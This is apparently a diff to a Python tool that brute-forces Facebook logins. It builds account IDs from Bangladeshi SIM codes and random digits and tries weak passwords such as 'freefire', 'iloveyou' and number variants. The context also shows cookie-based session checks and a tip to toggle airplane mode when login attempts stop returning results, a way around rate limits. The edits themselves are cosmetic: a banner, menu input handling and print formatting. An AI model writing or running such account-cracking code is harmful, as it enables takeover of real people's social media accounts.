@@ -120,9 +120,9 @@ logo=("""
 ┃ ██████  ██████   █████  ┃ ➊ OWNER ➸ BRA ┃
 ┃ ██   ██ ██   ██ ██   ██ ┃ ➋ TOOLS ➸ BRA ┃
 ┃ ██████  ██████  ███████ ┃ ➌ VRSON ➸ 0.1 ┃
-┃ ██   ██ ██   ██ ██   ██ ┃ ➍ STTUS ➸ OWN ┃╔═╗╔═╗╔═╗
-┃ ██████  ██   ██ ██   ██ ┃ ➎ RANKS ➸ 1.X ┃║═╣╠╦╝╠═╣
-╚━━━━━━━━━━━━━━━━━━━━━━━━━╩━━━━━━━━━━━━━━━╝╚═╝╩╚═╩ ╩ 
+┃ ██   ██ ██   ██ ██   ██ ┃ ➍ STTUS ➸ OWN ┃
+┃ ██████  ██   ██ ██   ██ ┃ ➎ RANKS ➸ 1.X ┃
+╚━━━━━━━━━━━━━━━━━━━━━━━━━╩━━━━━━━━━━━━━━━╝
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
 def cek_apk(session,coki):
 	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
@@ -157,7 +157,7 @@ def Main():
 	print('\033[1;37m[0] \033[1;95mEXIT PROGRAMMING')
 	print('\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 	opt = input('Choose option >>> ')
-	if opt in ["A","1"]:
+	if opt in ["A","a","1"]:
 		os.system('xdg-open https://www.facebook.com/')
 		BRA()
 	if opt in ["B","2"]:
@@ -217,9 +217,9 @@ def BRA():
 		
 		print('\033[32;1m┏━[\033[34;1m•\033[32;5m] TOTAL ACCOUNT ► '+tl)
 		print('\033[32;1m┣━[\033[34;1m•\033[32;5m] COUNTRY       ► Bangladesh')
-		print(f'\033[32;1m┣━[\033[34;1m•\033[32;5m] SIM CODE   : \033[1;92m {kode} ')
-		print('\033[32;1m┗━[\033[34;1m•\033[32;5m] IF NO RESULTS (ON/OFF) AIRPLANE MODE')
-		print(50*'━')
+		print(f'\033[32;1m┣━[\033[34;1m•\033[32;5m] SIM CODE      ► \033[1;92m {kode} ')
+		print('\033[32;1m┗━[\033[34;1m•\033[32;5m] IF NO RESULTS \033[1;93m(ON/OFF) AIRPLANE MODE')
+		print('\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 		for guru in user:
 			uid = kode+koda+kodb+guru
 			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','freefire','Free fire','iloveyou','Bangladesh','bangladesh','i love you']
@@ -290,4 +290,3 @@ def b(uid,pwx,tl):
         pass
 Main()
 
-	
